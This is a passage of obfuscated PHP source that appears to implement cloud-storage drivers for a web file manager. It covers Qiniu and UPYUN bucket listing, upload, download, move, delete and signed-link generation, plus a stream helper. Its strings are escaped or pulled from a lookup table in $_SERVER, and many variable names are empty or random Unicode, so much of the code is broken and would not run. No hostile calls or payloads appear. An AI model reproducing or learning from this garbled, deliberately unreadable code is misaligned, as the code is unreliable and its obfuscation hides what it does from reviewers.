show_json("{$}\x28\51\x20\x6e\157\x74\40\145\170\151\163\x74\x3b", !1); } } } public static function addMethod($, $) { self::$_methodList[$] = $; } public static function addMethodStatic($Ɠ޾, $) { self::$_methodListStatic[$Ɠ޾] = $; } } goto Dֿ; A㶣: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($Ґ) { parent::__construct(); require_once SDK_DIR . $_SERVER[ܮ][1735]; $this->_init($Ґ); } public function _init($ݠ) { $윢 =& $_SERVER[ܮ]; $this->config = $ݠ; foreach ($ݠ as $ǎ => $܊ǣ) { if (isset($this->{$ǎ})) { $this->{$ǎ} = $܊ǣ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($윢[1736] . LNG($윢[1673])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($, $ = '', $Ŝ = REPEAT_RENAME) { if ($this->setContent($, $)) { return $this->getPathOuter($); } return !1; } public function mkdir($٪, $㈂ = REPEAT_SKIP) { $ݏ =& $_SERVER[ܮ]; $Β = trim($٪, $ݏ[8]); if ($this->_isFolder($Β)) { return $this->getPathOuter($Β); } $٪ = $Β . $ݏ[8]; $ߨ = get_path_this($Β); $ = $٪ . $ߨ; if (!$this->mkfile($)) { return !1; } if (!$this->moveFile($, $٪)) { $this->delFile($); return !1; } return $this->getPathOuter($Β); } public function copyFile($, $쵨) { $ϔ = $this->bucketManager->copy($this->bucket, $, $this->bucket, $쵨, !0); return $ϔ ? !1 : $this->getPathOuter($쵨); } public function moveFile($շ, $) { $Ҡ = $this->bucketManager->move($this->bucket, $շ, $this->bucket, $, !0); return $Ҡ ? !1 : $this->getPathOuter($); } public function delFile($ί) { if (!$this->exist($ί)) { return !0; } $ = $this->bucketManager->delete($this->bucket, $ί); if (!$) { return !0; } return $->code() == 612 ? !0 : !1; } public function delFolder($) { $ǿ =& $_SERVER[ܮ]; if (!$this->exist($)) { return !0; } $this->listItemCache = !1; $ = $this->fileList($); $this->listItemCache = !0; $ի = trim($, $ǿ[8]) . $ǿ[8]; if (!empty($) && $ !== $ǿ[228] && !in_array($ի, $[$ǿ[85]])) { $[$ǿ[85]][] = $ի; } $묵 = $this->delByBatch($[$ǿ[86]]); if (!$묵) { return !1; } $묵 = $this->delByBatch($[$ǿ[85]]); if (!$묵) { return !1; } return $this->delFile($ի); } private function delByBatch($´۴Δ) { foreach (array_chunk($´۴Δ, 1000) as $) { $ = $this->bucketManager->buildBatchDelete($this->bucket, $); list($, $ЙҚ) = $this->bucketManager->batch($); if ($ЙҚ) { return !1; } } return !0; } public function rename($Ԭ, $) { return $this->renameObject($Ԭ, $); } public function fileInfo($, $ފ = false, $ĘȄ = array()) { $ٜ =& $_SERVER[ܮ]; $揜 = array($ٜ[32] => $this->pathThis($), $ٜ[87] => $this->getPathOuter($ٜ[8] . $), $ٜ[33] => $ٜ[230], $ٜ[79] => isset($ĘȄ[$ٜ[1737]]) ? $ĘȄ[$ٜ[1737]] : 0, $ٜ[166] => $this->ext($)); if ($ފ) { return $揜; } $揜[$ٜ[231]] = $揜[$ٜ[88]] = 0; $揜[$ٜ[232]] = $揜[$ٜ[233]] = !0; if (empty($ĘȄ)) { $ĘȄ = $this->objectMeta($); if (!$ĘȄ) { return $揜; } } if (isset($ĘȄ[$ٜ[234]]) && $ĘȄ[$ٜ[234]]) { $揜[$ٜ[235]] = $ĘȄ[$ٜ[234]]; } if (isset($ĘȄ[$ٜ[245]]) && $ĘȄ[$ٜ[245]]) { $揜[$ٜ[235]] = $ĘȄ[$ٜ[245]]; } if (isset($ĘȄ[$ٜ[1738]])) { $揜[$ٜ[88]] = substr($ĘȄ[$ٜ[1738]] . $ٜ[12], 0, 10); } if (isset($ĘȄ[$ٜ[1737]])) { $揜[$ٜ[79]] = $ĘȄ[$ٜ[1737]]; } return $揜; } public function folderInfo($, $ = false) { $Ȉ =& $_SERVER[ܮ]; $ = array($Ȉ[32] => $this->pathThis($), $Ȉ[87] => $this->getPathOuter($Ȉ[8] . $), $Ȉ[33] => $Ȉ[78]); if ($) { return $; } $[$Ȉ[231]] = $[$Ȉ[88]] = 0; $[$Ȉ[232]] = $[$Ȉ[233]] = !0; $ = rtrim($, $Ȉ[8]) . $Ȉ[8]; $Ŷ = $this->objectMeta($); if (isset($Ŷ[$Ȉ[1738]])) { $[$Ȉ[88]] = substr($Ŷ[$Ȉ[1738]] . $Ȉ[12], 0, 10); } return $; } public function listPath($¥, $ǃ = false) { $˺ =& $_SERVER[ܮ]; $ = $this->fileList($¥, $˺[8], !0); foreach ($[$˺[85]] as $٭ => $) { $[$˺[85]][$٭] = $this->folderInfo($, $ǃ); } foreach ($[$˺[86]] as $٭ => $) { $[$˺[86]][$٭] = $this->fileInfo($[$˺[32]], $ǃ, $); } return $; } public function has($, $󢕏 = false, $ʰ = true) { $㟣 =& $_SERVER[ܮ]; $ = trim($, $㟣[8]); $ހ˃ = empty($) && $ !== $㟣[228] ? $㟣[12] : $ . $㟣[8]; $ = $㟣[12]; $ = 500; $ = $㟣[8]; $ = $јʊ = 0; while (!0) { check_abort(); list($܅, $˻) = $this->bucketManager->listFiles($this->bucket, $ހ˃, $, $, $); if ($˻) { break; } $ = array_key_exists($㟣[1685], $܅) ? $ = $܅[$㟣[1739]] : $㟣[12]; if ($󢕏) { if (!empty($܅[$㟣[1740]])) { $ += count($܅[$㟣[1740]]); } if (!empty($܅[$㟣[1741]])) { $јʊ += count($܅[$㟣[1741]]); } if ($ === $㟣[12]) { break; } continue; } if ($ʰ) { if (!empty($܅[$㟣[1740]])) { return !0; } } else { if (!empty($܅[$㟣[1741]])) { return !0; } } if ($ === $㟣[12]) { break; } } if ($󢕏) { return array($㟣[239] => $, $㟣[240] => $јʊ); } return !1; } public function listAll($Β) { $͒۟ =& $_SERVER[ܮ]; $ߠ = $this->fileList($Β, $͒۟[12], !0); $ؾ = array_to_keyvalue($ߠ[$͒۟[86]], $͒۟[32]); foreach ($ߠ[$͒۟[85]] as $Њ) { if (is_string($Њ)) { $ؾ[$Њ] = array($͒۟[79] => 0); } } return $this->listAllFiles($Β, $ؾ); } private function fileList($, $鐻 = '', $ʀ = 0) { $ߛ =& $_SERVER[ܮ]; $ = trim($, $ߛ[8]); $Ω = empty($) && $ !== $ߛ[228] ? $ߛ[12] : $ . $ߛ[8]; $ = $ߛ[12]; $ = 1000; $㰃 = $쌹 = array(); while (!0) { check_abort(); list($, $) = $this->bucketManager->listFiles($this->bucket, $Ω, $, $, $鐻); if ($) { break; } $ = array_key_exists($ߛ[1685], $) ? $ = $[$ߛ[1739]] : $ߛ[12]; $ = isset($[$ߛ[1740]]) ? $[$ߛ[1740]] : array(); $ = isset($[$ߛ[1741]]) ? $[$ߛ[1741]] : array(); foreach ($ as $) { if ($[$ߛ[95]] == $Ω) { continue; } $٪ = $[$ߛ[95]]; $Ђ = $[$ߛ[1737]]; $[$ߛ[32]] = $٪; $[$ߛ[79]] = $Ђ; $ = $Ђ == 0 && substr($٪, strlen($٪) - 1, 1) == $ߛ[8] ? !0 : !1; $this->cacheMethodInfoSet($٪, $, $); if ($) { $㰃[] = $٪; continue; } $쌹[] = $ʀ ? $ : $٪; } foreach ($ as $٪) { if ($٪ == $Ω) { continue; } $㰃[] = $٪; $this->cacheMethodInfoSet($٪, !0); } if ($ === $ߛ[12]) { break; } } $this->cacheMethodInfoSet($, !0); return array($ߛ[85] => $㰃, $ߛ[86] => $쌹); } public function canRead($) { return $this->exist($) ? !0 : !1; } public function canWrite($𫣖) { return $this->exist($𫣖) ? !0 : !1; } public function getContent($ڋ) { return $this->fileSubstr($ڋ, 0, -1); } public function setContent($늆־, $ = '') { $է = $this->tempFile($this->pathThis($늆־)); file_put_contents($է, $); if ($this->upload($늆־, $է)) { $this->tempFileRemve($է); return !0; } return !1; } public function refreshUrls($) { $ӷ =& $_SERVER[ܮ]; $ = array(); if (is_array($)) { foreach ($ as $ɑҖ) { $[] = $this->link($ɑҖ); } } else { $[] = $this->link($); } $ = new Qiniu\Cdn\CdnManager($this->auth); list($Ӹ, $Ȑو) = $->refreshUrls($); if ($Ȑو) { return !1; } return $Ӹ[$ӷ[1371]] == $ӷ[858] ? !0 : !1; } public function fileSubstr($, $쮰ף, $г) { $ =& $_SERVER[ܮ]; if (!($֩ԟ = $this->link($))) { return !1; } $ = !1; if ($г > 0) { $ = $쮰ף + $г - 1; $ = array($[1605] . $쮰ף . $[476] . $); } $ = url_request($֩ԟ, $[1606], !1, $); return $[$[848]] ? $[$[1393]] : !1; } public function upload($ә, $, $Ҷ = false, $ = REPEAT_REPLACE) { if (!$ || !@file_exists($)) { return !1; } $ޢ = new Qiniu\Storage\UploadManager(); $ = $this->auth->uploadToken($this->bucket, $ә); $ = get_file_mime(get_path_ext($)); list($, $) = $ޢ->putFile($, $ә, $, null, $); return $ ? !1 : $this->getPathOuter($ә); } public function uploadFormData($ߓ, $ = 3600) { return $this->uploadToken($ߓ, $); } public function uploadMultiData($΢ۘ, $þ = 3600) { return $this->uploadToken($΢ۘ, $þ); } private function uploadToken($, $ = 3600) { $浒 =& $_SERVER[ܮ]; $մ = $; $촿 = array($浒[1742] => $浒[1743]); $㚗 = $; $и۝ = $this->auth->uploadToken($this->bucket, $㚗, $մ, $촿, !0); $ɭ = empty($this->region) || $this->region == $浒[1744] ? $浒[12] : $浒[476] . $this->region; $̵ؔ = http_type() . "\x3a\x2f\57\x75\160\154\x6f\x61\144{$ɭ}\x2e\161\151\156\x69\x75\160\56\143\157\155\x2f"; return array($浒[1745] => $и۝, $浒[1608] => $̵ؔ); } public function download($Ǝ, $) { $ = IO::getPathInner(IO::mkfile($)); if (!($ = $this->link($Ǝ))) { return !1; } $ű = 0; $˅ = 1024 * 200; $߳ = fopen($, $_SERVER[ܮ][1746]); while (!0) { $ = $this->fileSubstr($Ǝ, $ű, $˅); if ($ === !1) { return !1; } fwrite($߳, $); $ű += $˅; if (strlen($) < $˅) { break; } } fclose($߳); return $; } public function link($ڐ, $䮊 = '') { if (!$this->isFile($ڐ)) { return !1; } $ = $this->getHost() . $_SERVER[ܮ][8] . $this->pathEncode($ڐ) . $䮊; return $this->auth->privateDownloadUrl($, 3600 * 12); } public function fileOut($, $ = false, $ = false, $ = '') { $牅 =& $_SERVER[ܮ]; if ($this->isFileOutServer()) { return $this->fileOutServer($, $, $, $); } if (!$) { $ = $this->pathThis($); } $ְ = $ ? $牅[1747] . rawurlencode($) : $牅[12]; $׽݂ = $this->link($, $ְ); $this->fileOutLink($׽݂); } public function fileOutServer($睕, $ = false, $ʲ = false, $ = '') { parent::fileOut($睕, $, $ʲ, $); } public function fileOutImage($σ, $ᰙ = 250) { if ($this->size($σ) > 1024 * 1024 * 20) { return $this->fileOutImageServer($σ, $ᰙ); } $Я = $this->link($σ, $_SERVER[ܮ][1748] . $ᰙ); $this->fileOutLink($Я); } public function fileOutImageServer($̋, $׈ = 250) { parent::fileOutImage($̋, $׈); } public function hashMd5($) { $ =& $_SERVER[ܮ]; $© = $this->objectMeta($); return isset($©[$[245]]) ? $©[$[245]] : !1; $ݪ = $this->link($, $[1749]); } public function size($) { $ = $this->objectMeta($); return $ ? $[$_SERVER[ܮ][79]] : 0; } public function info($ܨܢ) { if ($this->isFolder($ܨܢ)) { return $this->folderInfo($ܨܢ); } else { if ($this->isFile($ܨܢ)) { return $this->fileInfo($ܨܢ); } } return !1; } public function exist($) { return $this->isFile($) || $this->isFolder($); } public function isFile($у) { return !$this->isFolder($у) && $this->objectMeta($у); } public function isFolder($Ł) { return $this->cacheMethod($_SERVER[ܮ][177], $Ł); } protected function objectMeta($ʏ) { return $this->cacheMethod($_SERVER[ܮ][179], $ʏ); } protected function _objectMeta($͇) { $֚ =& $_SERVER[ܮ]; list($ջ, $顁) = $this->bucketManager->stat($this->bucket, $͇); if ($ջ) { $ջ[$֚[79]] = intval($ջ[$֚[1737]]); } return $ջ; } protected function _isFolder($ճ) { $񂙑 =& $_SERVER[ܮ]; if ($ճ == $񂙑[12] || $ճ == $񂙑[8]) { return !0; } list($Ѹ, $) = $this->bucketManager->listFiles($this->bucket, trim($ճ, $񂙑[8]) . $񂙑[8], $񂙑[12], 1, $񂙑[8]); return !empty($Ѹ[$񂙑[1740]]) || !empty($Ѹ[$񂙑[1741]]) ? !0 : !1; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($ď, $ = 0) { parent::__construct(); $this->source = $ď; $this->sourceSize = $; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($ = false) { return $this->sourceSize; } public function getContent($ޡƢ = false) { return $this->fileSubstr($ޡƢ, 0, $this->sourceSize); } public function fileSubstr($ٿ = false, $ = 0, $ĉϫ = 0) { if (!$ĉϫ) { $ĉϫ = $this->sourceSize; } $љ̱ = $this->sourceSize - $; if ($ĉϫ >= $љ̱) { $ĉϫ = $љ̱; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $, $ĉϫ); } if ($this->sourceType == self::TYPE_FILE) { if ($ĉϫ <= 0) { return $_SERVER[ܮ][12]; } $ʻ = ftell($this->source); fseek_64($this->source, $ʻ + $); $ = @fread($this->source, $ĉϫ); fseek_64($this->source, $ʻ); return $; } } public function hashMd5($͛ = false) { return md5($this->getContent()); } public static function hash($, $ط = 0) { $ = new PathDriverStream($, $ط); return $->hashSimple($); } public static function md5($Ѹ, $В = 0) { $ = new PathDriverStream($Ѹ, $В); return $->hashMd5($Ѹ); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\x74\160\x3a\57\x2f\166\x30\x2e\x61\160\151\x2e\x75\160\171\x75\x6e\56\x63\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($) { parent::__construct(); $this->_init($); } public function _init($) { $ =& $_SERVER[ܮ]; foreach ($ as $ֽ => $봉) { if (isset($this->{$ֽ})) { $this->{$ֽ} = $봉; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($[1750] . LNG($[1673])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($ߧ, $ȗ = "\107\105\x54") { $͸ؖ =& $_SERVER[ܮ]; $ = gmdate($͸ؖ[1702]); $ = base64_encode(hash_hmac($͸ؖ[1751], "{$ȗ}\x26{$ߧ}\46{$}", md5("{$this->userpass}"), !0)); $֊ = array("\x41\165\x74\x68\x6f\x72\x69\x7a\x61\x74\x69\157\156\72\125\x50\x59\125\x4e\x20{$this->username}\72{$}", "\x44\x61\164\x65\x3a{$}"); return $֊; } public function ussRequest($, $ = "\107\105\x54", $Վ = false, $ = false, $ = false) { $ =& $_SERVER[ܮ]; $ = trim($, $[8]); $㟸ɷ = "\57{$this->bucket}\x2f" . rawurlencode($); $ = $this->ussHeaders($㟸ɷ, $); if ($) { $ = array_merge($, $); } $֦ = url_request($this->endpoint . $㟸ɷ, $, $Վ, $, $); if (!$֦) { $ = LNG($[1752]); $this->writeLog($); return array($[1403] => !1, $[1393] => $); } if (strtolower($) == $[227] || in_array($֦[$[1403]], array($[261], $[1753]))) { $Վ = $֦[$[1754]]; if (!$֦[$[848]]) { $Վ = isset($Վ[0]) ? $Վ[0] : $[12]; } } else { $Վ = json_decode($֦[$[1393]], !0); if (!$Վ) { $Վ = $֦[$[1393]]; } else { if (!$֦[$[848]] && isset($Վ[$[1755]])) { $Վ = $Վ[$[1755]]; } } } if (!$֦[$[848]]) { $this->writeLog($this->__errorMessage($Վ)); } return array($[1403] => $֦[$[848]], $[1393] => $Վ); } private function __errorMessage($岁) { $Қ =& $_SERVER[ܮ]; if (!$岁) { return $Қ[12]; } static $兿 = null; if (!$兿) { $兿 = I18n::getType(); } if ($兿 != $Қ[1710]) { return $岁; } $֐팢 = array($Қ[1756] => $Қ[1757], $Қ[1758] => $Қ[1759], $Қ[1760] => $Қ[1759], $Қ[1761] => $Қ[1762], $Қ[1763] => $Қ[1764], $Қ[1765] => $Қ[1766], $Қ[1767] => $Қ[1768]); return isset($֐팢[$岁]) ? $֐팢[$岁] : $岁; } public function mkfile($֖, $ɼ = '', $ŏ = REPEAT_RENAME) { if ($this->setContent($֖, $ɼ)) { return $this->getPathOuter($֖); } return !1; } public function mkdir($Ө͊, $ = REPEAT_SKIP) { $ =& $_SERVER[ܮ]; $ = trim($Ө͊, $[8]); if ($this->_isFolder($)) { return $this->getPathOuter($); } $׋ = array($[1769]); $Ȅ = $this->ussRequest($, $[288], !1, $׋); return $Ȅ[$[1403]] ? $this->getPathOuter($) : !1; } public function copyFile($Ơ, $и) { $҈ =& $_SERVER[ܮ]; $ךʌ = array($҈[1770] . "\x2f{$this->bucket}\57{$Ơ}", $҈[1771]); $ەھ = $this->ussRequest($и, $҈[253], !1, $ךʌ); return $ەھ[$҈[1403]] ? !0 : $this->getPathOuter($и); } public function moveFile($ʀ, $) { $򟇊 =& $_SERVER[ܮ]; $ù = array($򟇊[1772] . "\x2f{$this->bucket}\x2f{$ʀ}", $򟇊[1771]); $Ҁ = $this->ussRequest($, $򟇊[253], !1, $ù); return $Ҁ[$򟇊[1403]] ? !0 : $this->getPathOuter($); } public function delFile($) { $ =& $_SERVER[ܮ]; $ª = $this->ussRequest($, $[1773]); return $ª[$[1403]] ? !0 : !1; } public function delFolder($Ģ͗) { $ر =& $_SERVER[ܮ]; if (!$this->exist($Ģ͗)) { return !0; } $this->listItemCache = !1; $個 = $д = array(); $this->fileList($Ģ͗, $個, $д, !0); $this->listItemCache = !0; foreach ($д as $׌ݦ) { $؇̪ = $this->ussRequest($׌ݦ[$ر[32]], $ر[1773]); if (!$؇̪[$ر[1403]]) { return !1; } } usort($個, function ($̋, $专) { $ =& $_SERVER[ܮ]; return substr_count($专, $[8]) - substr_count($̋, $[8]); }); foreach ($個 as $⇀) { $؇̪ = $this->ussRequest($⇀, $ر[1773]); if (!$؇̪[$ر[1403]]) { return !1; } } $؇̪ = $this->ussRequest($Ģ͗, $ر[1773]); return $؇̪[$ر[1403]]; } public function rename($Մ, $ω) { if ($this->isFile($Մ)) { $ω = get_path_father($Մ) . $ω; return $this->moveFile($Մ, $ω); } return $this->renameObject($Մ, $ω); } public function fileInfo($Ϩ, $ܳݮ = false, $ = array()) { $Ł =& $_SERVER[ܮ]; $Ȏ = array($Ł[32] => $this->pathThis($Ϩ), $Ł[87] => $this->getPathOuter($Ł[8] . $Ϩ), $Ł[33] => $Ł[230], $Ł[79] => isset($[$Ł[79]]) ? $[$Ł[79]] : 0, $Ł[166] => $this->ext($Ϩ)); if ($ܳݮ) { return $Ȏ; } $Ȏ[$Ł[231]] = $Ȏ[$Ł[88]] = 0; $Ȏ[$Ł[232]] = $Ȏ[$Ł[233]] = !0; if (empty($)) { $ = $this->objectMeta($Ϩ); if (!$) { return $Ȏ; } } $Ȏ[$Ł[231]] = intval($[$Ł[1774]]); $Ȏ[$Ł[88]] = intval($[$Ł[1775]]); $Ȏ[$Ł[79]] = $[$Ł[79]]; return $Ȏ; } public function folderInfo($Ο, $кܓ = false) { $ =& $_SERVER[ܮ]; $ϳ = array($[32] => $this->pathThis($Ο), $[87] => $this->getPathOuter($[8] . $Ο), $[33] => $[78]); if ($кܓ) { return $ϳ; } $ϳ[$[231]] = $ϳ[$[88]] = 0; $ϳ[$[232]] = $ϳ[$[233]] = !0; if (empty($ߪ)) { $ߪ = $this->objectMeta($Ο); if (!$ߪ) { return $ϳ; } } $ϳ[$[231]] = intval($ߪ[$[1774]]); $ϳ[$[88]] = intval($ߪ[$[1775]]); return $ϳ; } private function listObjs($, $ʁ˰ = 0, $إ = 1000) { $ð =& $_SERVER[ܮ]; $ = array($ð[1776], $ð[1777] . $إ); if ($ʁ˰) { $[] = $ð[1778] . $ʁ˰; } $ = $this->ussRequest($, $ð[1606], !1, $); return !$[$ð[1403]] ? !1 : $[$ð[1393]]; } private function fileList($Ӝ, &$, &$˙, $Ԇ = false) { $պ =& $_SERVER[ܮ]; $ִ = $պ[12]; $ = 1000; $ = rtrim($Ӝ, $պ[8]) . $պ[8]; while (!0) { check_abort(); $؉ = $this->listObjs($Ӝ, $ִ, $); if (!$؉) { return !1; } $ִ = isset($؉[$պ[1779]]) ? $؉[$պ[1779]] : $պ[12]; $湶 = isset($؉[$պ[1780]]) ? $؉[$պ[1780]] : array(); foreach ($湶 as $) { $ = $[$պ[33]] == $պ[78] ? !0 : !1; $ّ = ltrim($ . $[$պ[32]], $պ[8]) . ($ ? $պ[8] : $պ[12]); $ܟҝ = array($պ[32] => $ّ, $պ[33] => $ ? $պ[78] : $պ[230], $պ[79] => $[$պ[412]], $պ[1775] => $[$պ[1781]]); $this->cacheMethodInfoSet($ّ, $, $ܟҝ); if ($) { $[] = $ّ; if ($Ԇ) { $this->fileList($ّ, $, $˙, $Ԇ); } continue; } $˙[] = $ܟҝ; } if (count($湶) < $) { break; } } $this->cacheMethodInfoSet($Ӝ, !0); } public function listPath($϶, $鯯 = false) { $Ѥ =& $_SERVER[ܮ]; $ = $ē = array(); $this->fileList($϶, $, $ē); foreach ($ as $ݦЇ => $脲) { $[$ݦЇ] = $this->folderInfo($脲, $鯯); } foreach ($ē as $ݦЇ => $脲) { $ē[$ݦЇ] = $this->fileInfo($脲[$Ѥ[32]], $鯯, $脲); } return array($Ѥ[85] => $, $Ѥ[86] => $ē); } public function has($ϡ, $Ŗ = false, $譀 = true) { $ =& $_SERVER[ܮ]; $ѻ圣 = $[12]; $ = 500; $ƕ = 0; $ = 0; $Ƞ = rtrim($ϡ, $[8]) . $[8]; while (!0) { check_abort(); $θ = $this->listObjs($ϡ, $ѻ圣, $); if (!$θ) { return !1; } $ѻ圣 = isset($θ[$[1779]]) ? $θ[$[1779]] : $[12]; $݉ = isset($θ[$[1780]]) ? $θ[$[1780]] : array(); if (empty($݉)) { break; } $ = array_filter($݉, function ($) { $Ѯ =& $_SERVER[ܮ]; return $[$Ѯ[33]] == $Ѯ[78]; }); $ÿ = count($݉); $ = count($); $ = $ÿ - $; if ($Ŗ) { $ += $; $ƕ += $; if ($ÿ < $) { break; } continue; } if ($譀) { if ($) { return !0; } } else { if ($) { return !0; } } if ($ÿ < $) { break; } } if ($Ŗ) { return array($[239] => $ƕ, $[240] => $); } return !1; } public function listAll($Џܺ) { $˩ =& $_SERVER[ܮ]; $ńɅ = $ = array(); $this->fileList($Џܺ, $ńɅ, $, !0); $ǳ = array_to_keyvalue($, $˩[32]); foreach ($ńɅ as $߃) { if (is_string($߃)) { $ǳ[$߃] = array($˩[79] => 0); } } return $this->listAllFiles($Џܺ, $ǳ); } public function canRead($ưθ) { return $this->exist($ưθ) ? !0 : !1; } public function canWrite($) { return $this->exist($) ? !0 : !1; } public function getContent($) { return $this->fileSubstr($, 0, -1); } public function setContent($ʈ, $ȿ = '') { $ =& $_SERVER[ܮ]; if (!$ȿ) { $ = $this->ussRequest($ʈ, $[288]); return $[$[1403]]; } $Ɵ = $this->tempFile($this->pathThis($ʈ)); file_put_contents($Ɵ, $ȿ); if ($this->upload($ʈ, $Ɵ)) { $this->tempFileRemve($Ɵ); return !0; } return !1; } public function fileSubstr($, $僉, $) { $˞ķτ =& $_SERVER[ܮ]; if (!($ڀݾ = $this->link($))) { return !1; } $܉ = !1; if ($ > 0) { $ = $僉 + $ - 1; $܉ = array($˞ķτ[1605] . $僉 . $˞ķτ[476] . $); } $Յ = url_request($ڀݾ, $˞ķτ[1606], !1, $܉); return $Յ[$˞ķτ[848]] ? $Յ[$˞ķτ[1393]] : !1; } public function upload($ϖں, $, $槼 = false, $ = REPEAT_REPLACE) { $߾ =& $_SERVER[ܮ]; if (!$ || !@file_exists($)) { return !1; } $ͼ = IO::size($); if ($ͼ <= 1024 * 1024 * 200) { $ = array($߾[1782] . $); $ = $this->ussRequest($ϖں, $߾[253], $); return $[$߾[1403]] ? $this->getPathOuter($ϖں) : !1; } $߀ = 1024 * 1024 * 10; $ˍӍ = array($߾[1783], $߾[1784] . $ͼ, $߾[1785], $߾[1786] . $߀); $ = $this->ussRequest($ϖں, $߾[253], !1, $ˍӍ); if (!$[$߾[1403]]) { return !1; } $셔 = $[$߾[1393]]; $쀀ǥ = 0; $ڃ¢ = $셔[$߾[1787]]; $ڊ = fopen($, $߾[1667]); if (!$ڊ) { return !1; } do { $ɦ = $셔[$߾[1788]]; fseek_64($ڊ, $쀀ǥ); $𐇤 = fread($ڊ, $ɦ); $ = 0; do { $++; $셔 = $this->uploadPart($ϖں, $셔, $𐇤); } while (!$셔 && $ < 3); if (!$셔) { return !1; } $ڃ¢ = $셔[$߾[1787]]; $쀀ǥ += $ɦ; } while ($ڃ¢ != -1); fclose($ڊ); $ˍӍ = array($߾[1789], $߾[1790] . $셔[$߾[1791]], $߾[1785]); $ = $this->ussRequest($ϖں, $߾[253], !1, $ˍӍ); return $[$߾[1403]] ? $this->getPathOuter($􂤻) : !1; } private function uploadPart($, $Ϋ, &$) { $ =& $_SERVER[ܮ]; $ = array($[1792], $[1790] . $Ϋ[$[1791]], $[1793] . $Ϋ[$[1787]], $[143] . $Ϋ[$[1788]]); $ = $this->ussRequest($, $[253], $, $); return !$[$[1403]] ? $[$[1403]] : $[$[1393]]; } public function uploadFormData($ю, $崒 = 3600) { return $this->uploadPolicy($ю, $崒); } public function uploadMultiData($ئ, $ͯ = 3600) { $ħ =& $_SERVER[ܮ]; $͎Ƚ = (int) $GLOBALS[$ħ[7]][$ħ[79]]; return $this->uploadPolicy($ئ, $ͯ, $͎Ƚ); } private function uploadPolicy($, $ = 3600, $· = 0) { $ =& $_SERVER[ܮ]; $ܱ = $[8] . $this->bucket; $Ύ = gmdate($[1702]); $Ұ = array($[1794] => $this->bucket, $[1795] => $, $[1796] => time() + $, $[1797] => $Ύ); if ($·) { $Ұ[$[1687]] = $·; } $ڝ = base64_encode(json_encode($Ұ)); $ = base64_encode(hash_hmac($[1751], "\120\117\123\x54\x26{$ܱ}\46{$Ύ}\x26{$ڝ}", md5("{$this->userpass}"), !0)); $Ǿ = array($[277] => $ڝ, $[1798] => "\x55\120\131\125\x4e\x20{$this->username}\72{$}", $[206] => $this->endpoint . $ܱ); return $Ǿ; } public function download($֗, $곡) { $픰 = IO::getPathInner(IO::mkfile($곡)); if (!($ = $this->link($֗))) { return !1; } $㵵 = 0; $ = 1024 * 200; $ʃ = fopen($픰, $_SERVER[ܮ][1746]); while (!0) { $ݶ = $this->fileSubstr($֗, $㵵, $); if ($ݶ === !1) { return !1; } fwrite($ʃ, $ݶ); $㵵 += $; if (strlen($ݶ) < $) { break; } } fclose($ʃ); return $곡; } public function link($ý, $Ȓ = array()) { $ =& $_SERVER[ܮ]; $ý = trim($ý, $[8]); if (!empty($this->token)) { $󪐜 = strtotime(date($[1799])); $ = substr(md5($this->token . $[284] . $󪐜 . $[1800] . $ý), 12, 8) . $󪐜; $Ȓ[] = $[1801] . $; } $е = !empty($Ȓ) ? $[76] . implode($[284], $Ȓ) : $[12]; return $this->getHost() . $[8] . $this->pathEncode($ý) . $е; } public function fileOut($ޓ, $Ƒ = false, $ = false, $ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($ޓ, $Ƒ, $, $); } if (!$) { $ = $this->pathThis($ޓ); } $ = $Ƒ ? array($_SERVER[ܮ][1802] . rawurlencode($)) : array(); $ĕ = $this->link($ޓ, $); $this->fileOutLink($ĕ); } public function fileOutServer($È, $΍ = false, $ۤ = false, $㢅 = '') { parent::fileOut($È, $΍, $ۤ, $㢅); } public function fileOutImage($, $Æ = 250) { $ٶ = $this->link($ . $_SERVER[ܮ][1803] . $Æ); $this->fileOutLink($ٶ); } public function fileOutImageServer($, $🍍 = 250) { parent::fileOutImage($, $🍍); } public function hashMd5($﷒) { $߈ =& $_SERVER[ܮ]; $ʳɻ = $this->_objectMeta($﷒); return isset($ʳɻ[$߈[245]]) ? $ʳɻ[$߈[245]] : !1; } public function size($Ÿ) { $þƕ = $this->objectMeta($Ÿ); return $þƕ ? $þƕ[$_SERVER[ܮ][79]] : 0; } public function info($) { if ($this->isFolder($)) { return $this->folderInfo($); } else { if ($this->isFile($)) { return $this->fileInfo($); } } return !1; } public function exist($ڗŻ) { return $this->isFile($ڗŻ) || $this->isFolder($ڗŻ); } public function isFile($ޖ) { return !$this->isFolder($ޖ) && $this->objectMeta($ޖ); } public function isFolder($) { return $this->cacheMethod($_SERVER[ܮ][177], $); } protected function objectMeta($类) { return $this->cacheMethod($_SERVER[ܮ][179], $类); } protected function _objectMeta($󓗀) { $ٔ =& $_SERVER[ܮ]; if ($󓗀 == $ٔ[12] || $󓗀 == $ٔ[8]) { return array(); } $נ = $this->ussRequest($󓗀, $ٔ[1804]); if (!$נ[$ٔ[1403]]) { return null; } $ė = isset($נ[$ٔ[1393]]) ? $נ[$ٔ[1393]] : array(); if (!isset($ė[$ٔ[1805]])) { return null; } $퓍 = array($ٔ[33] => isset($ė[$ٔ[1805]]) ? $ė[$ٔ[1805]] : null, $ٔ[79] => isset($ė[$ٔ[1806]]) ? $ė[$ٔ[1806]] : null, $ٔ[245] => 